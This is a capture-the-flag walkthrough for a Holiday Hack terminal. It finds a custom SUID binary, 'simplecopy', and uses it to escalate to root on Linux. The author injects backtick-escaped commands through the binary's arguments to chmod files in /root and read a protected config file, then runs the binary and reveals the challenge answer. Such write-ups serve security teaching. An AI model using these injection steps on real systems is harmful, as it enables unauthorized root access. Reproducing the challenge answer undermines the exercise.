**Difficulty**: :material-pine-tree-variant::material-pine-tree-variant::material-pine-tree-variant::material-pine-tree-variant-outline::material-pine-tree-variant-outline:<br/>

## Objective

!!! question "Request"
    Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

??? quote "Rosemold"
    What am I doing in this saloon? The better question is: what planet are you from?<br/>
    Yes, Iâ€™m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here.<br/>
    Whatever. Do you know much about privilege escalation techniques on Linux?<br/>
    You're asking why? How about I'll tell you why after you help me.<br/>
    And you might have to use that big brain of yours to get creative, bub.<br/>

## Hints

??? tip "Linux Privilege Escalation Techniques"
    There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system. 

??? tip "Linux Command Injection"
    Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

## Solution

??? quote
    In a digital winter wonderland we play,
    Where elves and bytes in harmony lay.
    This festive terminal is clear and bright,
    Escalate privileges, and bring forth the light.

    Start in the land of bash, where you reside,
    But to win this game, to root you must glide.
    Climb the ladder, permissions to seize,
    Unravel the mystery, with elegance and ease.

    There lies a gift, in the root's domain,
    An executable file to run, the prize you'll obtain.
    The game is won, the challenge complete,
    Merry Christmas to all, and to all, a root feat!

    * Find a method to escalate privileges inside this terminal and then run the binary in /root *

We're not told what the binary we need to run is actually called, so my first step was to see if I could just see it:

```bash
$ ls /root/
ls: cannot open directory '/root/': Permission denied
```

Okay, so my ideal approach to solving this will be:
    1. Find a command with the SUID bit set so that it can access /root
    2. Use it to access /root to find the name of the command to run
    3. Use it to either give me access to the command or run it on my behalf

#### Step 1: Find a command with the SUID bit set

There's probably a smart way to do this, but the lazy way is to just start at /usr/bin with grep:
```bash
$ ls -l /usr/bin/ | grep rws
-rwsr-xr-x 1 root root     85064 Nov 29  2022 chfn
-rwsr-xr-x 1 root root     53040 Nov 29  2022 chsh
-rwsr-xr-x 1 root root     88464 Nov 29  2022 gpasswd
-rwsr-xr-x 1 root root     55528 May 30  2023 mount
-rwsr-xr-x 1 root root     44784 Nov 29  2022 newgrp
-rwsr-xr-x 1 root root     68208 Nov 29  2022 passwd
-rwsr-xr-x 1 root root     16952 Dec  2 22:17 simplecopy
-rwsr-xr-x 1 root root     67816 May 30  2023 su
-rwsr-xr-x 1 root root     39144 May 30  2023 umount
```

Interesting that `simplecopy` has a later write date and also doesn't sound familiar to me. What can it do?

```bash
$ simplecopy --help
Usage: simplecopy <source> <destination>
```

Looks like we probably have our winner.

#### Step 2: Use the SUID command to find the target command

```bash
$ simplecopy /root/* .
elf@1b594b95da0b:~$ ls -l
total 604
-rw-r--r-- 1 root root    628 Nov 27 17:07 HELP
-rwx------ 1 root root 612560 Jan  2 00:45 runmetoanswer
```

I, uh, wasn't expecting that to work...

#### Step 3: Use the SUID command to run the target command

Does OS command injection work?

```bash
$ simplecopy "\`echo 'hi'\`" test
cp: cannot stat 'hi': No such file or directory
```

Seems like it.

!!! info "Escaping"
    You need to escape the backticks, otherwise the shell will evaluate it before passing it to simplecopy.

So perhaps we can just make /root/runtoanswer generally executable:
```bash
$ simplecopy "\`chmod 777 /root\`" test
cp: missing destination file operand after 'test'
Try 'cp --help' for more information.
elf@1b594b95da0b:~$ simplecopy "\`chmod +sx /root/runmetoanswer\`" test
cp: missing destination file operand after 'test'
Try 'cp --help' for more information.
```

And then just run the executable:
```bash
$ /root/runmetoanswer 
Who delivers Christmas presents?

> Santa
Your answer: Santa

Checking....
Sorry, that answer is incorrect. Please try again!
```

Hmm, let's see if we can find anything useful in the binary:
```bash
$ simplecopy "\`chmod +rx /root/runmetoanswer\`" test
cp: missing destination file operand after 'test'
Try 'cp --help' for more information.
$ strings /root/runmetoanswer
```

That gives us a lot of output... what about:
```bash
$ strings -n 7 /root/runmetoanswer | grep -i answer
```
Hmm `/etc/runtoanswer.yaml` seems interesting:

```bash
$ simplecopy "\`cat /etc/runtoanswer.yaml > runtoanswer.yaml\`" .
cp: missing destination file operand after '.'
Try 'cp --help' for more information.
elf@1b594b95da0b:~$ ls
HELP  runmetoanswer  runtoanswer.yaml
elf@1b594b95da0b:~$ cat runtoanswer.yaml
```

So it was just case sensitive...

```bash
$ /root/runmetoanswer santa
```

??? info
    An alternative way to find the answer sheet would've been to try to run runtoanswer without the SUID bit:
    ```bash
    $ ./runmetoanswer 
    Something went wrong reading the configuration file /etc/runtoanswer.yaml: Couldn't open file: Permission denied (os error 13)

    If this persists, please ask for help!
    ```

## Response

!!! quote "Rosemold"
    Yup, I knew you knew. You just have that vibe.<br/>
    To answer your question of why from earlier... Nunya!<br/>
    But, I will tell you something better, about some information I... found.<br/>
    There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands.<br/>
    The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there.<br/>
    That's all I got. K byyeeeee.<br/>
    Ugh... n00bs...<br/>
